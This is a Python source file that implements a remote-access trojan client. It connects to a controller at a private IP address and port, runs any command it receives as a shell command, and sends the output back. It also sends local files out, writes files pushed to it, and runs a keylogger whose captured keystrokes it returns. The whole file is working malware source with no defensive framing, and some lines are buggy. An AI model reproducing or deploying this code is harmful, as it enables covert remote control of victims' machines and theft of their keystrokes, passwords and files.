#remote
import socket 
import subprocess
from subprocess import run
import base64
import os
import time
from pathlib import Path
import threading
from pynput.keyboard import Key  
from pynput.keyboard import Listener
import datetime
ip="192.168.1.53"
port=8003
cs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cs.connect((ip,port))
msg="TESTING.."
cs.send(msg.encode())
allkeys=''

def pressed(key):
    global allkeys
    allkeys+=str(key)+" "

def relees(key):
    pass

def keylog():
    l=Listener(on_press=pressed,on_release=relees)
    l.start()
while msg!="quit":
    
    msg=cs.recv(1024).decode()

    msg=list(msg.split(" "))

    if msg[0]=="lele":
        print("FIle Transfr MOde-- [}--)-{]")
        cfile_name=msg[1]
        f=open(Path(cfile_name),'r')
        contents=f.read()
        f.close()
        cs.send(contents.encode("utf-8"))
        print(" FIle:-> "+ cfile_name)
        msg=cs.recv(1024).decode()

    elif msg[0]=="dede":
        print("fILE Downloading--++_!")
        cr_file_name=msg[1]+"C2"
        f=open(Path(cr_file_name),'w')
        contents=cs.recv(2048).decode()
        f.write(contents.encode())
        f.close()
        msg=cs.recv(1024).decode()
        

        
    temp = ' '.join(msg)
    temp=temp.replace("["," ").replace("["," ")
    print(temp)
    if(temp=="done123"):
        closeyou="hogya"
        cs.send(closeyou.encode())
        cs.close()
        msg=cs.recv(1024).decode()


    elif temp=="keylogon":
        t1=threading.Thread(target=keylog)
        t1.start()
        msg="keylogger_started"
        cs.send(msg.encode())
        msg=cs.recv(1024).decode()
    elif temp=="keylogoff":
        t1.join()
        cs.send(allkeys.encode())
        msg=cs.recv(1024).decode()



    # p=subprocess.Popen(msg,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    p=subprocess.run(f"{temp}", capture_output=True,text=True,shell=True)
    output=p.stdout
    error=p.stderr
    a = run(f"kill {temp}", capture_output=True, text=True, shell=True)
    
    if len(output)>0:
        msg=str(output)
    else:
        msg="no output"
    cs.send(msg.encode())
    print(msg)


    
cs.close()




